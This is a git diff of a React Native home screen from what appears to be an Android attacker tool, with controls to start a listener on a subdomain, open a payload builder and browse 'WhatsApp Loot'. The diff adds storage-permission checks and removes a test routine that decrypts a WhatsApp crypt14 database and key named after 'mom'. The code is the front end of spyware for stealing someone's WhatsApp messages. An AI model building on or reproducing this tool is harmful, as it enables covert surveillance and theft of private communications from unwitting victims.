@@ -1,9 +1,11 @@
 import React, { useEffect, useState } from "react";
+import { PermissionsAndroid } from 'react-native';
 import { 
     Box,
     StatusBar, 
     Icon,
     Button,
+    useToast
 } from "native-base";
 import nodejs from 'nodejs-mobile-react-native';
 import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
@@ -14,13 +16,11 @@ import { setListening } from '../../redux/slices/userInfo'
 // components
 import ConnectingScreen from '../../components/ConnectingScreen'
 
-// test
-import RNFetchBlob from 'react-native-fetch-blob'
-import AppBuilder from '../../native-modules/AppBuilder'
 
 const Home = ({navigation}) => {
   const [visible, setVisible]= useState(false);
   const dispatch = useDispatch();
+  const toast = useToast();
   const { subdomain, isListening } = useSelector((state) => state.userInfo);
   useEffect(()=>{
     nodejs.channel.addListener("log",(log) => console.log(log), this);
@@ -28,9 +28,14 @@ const Home = ({navigation}) => {
   },[])
 
 
-  const handleStartLister = ()=>{
+  const handleStartLister =async()=>{
+    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
+    if (granted) {
       setVisible(true);
       nodejs.channel.post('startListener',subdomain)
+    }else{
+     requestPermission();
+    }
   }
   const handleStopLister = ()=>{
     nodejs.channel.post('stopListener')
@@ -42,15 +47,28 @@ const Home = ({navigation}) => {
     setVisible(false);
   }
   const handleAppBuilder = ()=>{
-    navigation.navigate('payloadBuilder')
+    navigation.navigate('payloadOptions')
+  }
+  const handleLoot = async()=>{
+    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
+     if (granted) {
+      navigation.navigate('loot')
+     }else{
+      requestPermission();
+     }
   }
 
-  const handleDecrypt =()=>{
-    const dirs = RNFetchBlob.fs.dirs;
-    var databaseFilename = dirs.SDCardDir +"/mom.crypt14";
-    var keyFilename = dirs.SDCardDir +"/mom.key";
-    AppBuilder.decrypt(databaseFilename, keyFilename,(d)=>console.log(d));
-  }
+  async function requestPermission() 
+   { 
+     try {
+          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
+          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
+               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
+          } 
+        } catch (err) { } 
+   }
+  
+
   
   return (
     <>
@@ -67,7 +85,7 @@ const Home = ({navigation}) => {
     <Button onPress={handleStopLister} variant={'subtle'} colorScheme={'tertiary'} mb={'10'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="signal-variant" size="sm" />}>
      {'Stop Listening'}
     </Button>}
-    <Button onPress={()=>navigation.navigate('loot')} variant={'subtle'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
+    <Button onPress={handleLoot} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
      {'WhatsApp Loot'}
     </Button>
     </Box>
